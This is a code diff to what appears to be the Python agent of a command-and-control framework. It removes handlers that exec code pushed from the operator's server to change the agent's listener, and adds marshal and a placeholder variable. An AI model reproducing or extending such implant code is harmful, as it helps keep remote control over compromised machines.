@@ -16,6 +16,7 @@ import BaseHTTPServer
 import zipfile
 import io
 import imp
+import marshal
 from os.path import expanduser
 from StringIO import StringIO
 from threading import Thread
@@ -40,7 +41,8 @@ jitter = 0.0
 lostLimit = 60
 missedCheckins = 0
 jobMessageBuffer = ''
-currentListenerName = " "
+currentListenerName = ""
+sendMsgFuncCode = ""
 
 # killDate form -> "MO/DAY/YEAR"
 killDate = 'REPLACE_KILLDATE'
@@ -464,23 +466,6 @@ def process_packet(packetType, data, resultID):
             send_message(build_response_packet(124, "Successfully remove repo: %s" % (repoName), resultID))
         except Exception as e:
             send_message(build_response_packet(124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID))
-    
-    elif packetType == 130:
-        # Dynamically update the listener for this agent
-        try:
-            code_obj = compile(data, '<string>', 'exec')
-            gl = dict(locals(), **globals())
-            exec(code_obj, gl, gl)
-            send_message(build_response_packet(130, currentListenerName, resultID))
-        except Exception as e:
-            send_message(build_response_packet(0, "Unable to update agent comms: %s" % e, resultID))
-
-    elif packetType == 131:
-        # Update the current listener name
-        global currentListenerName
-        currentListenerName = data
-
-        send_message(build_response_packet(131, "Updated currentListenerName to: %s" % data, resultID))
 
     else:
         return build_response_packet(0, "invalid tasking ID: %s" %(taskingID), resultID)
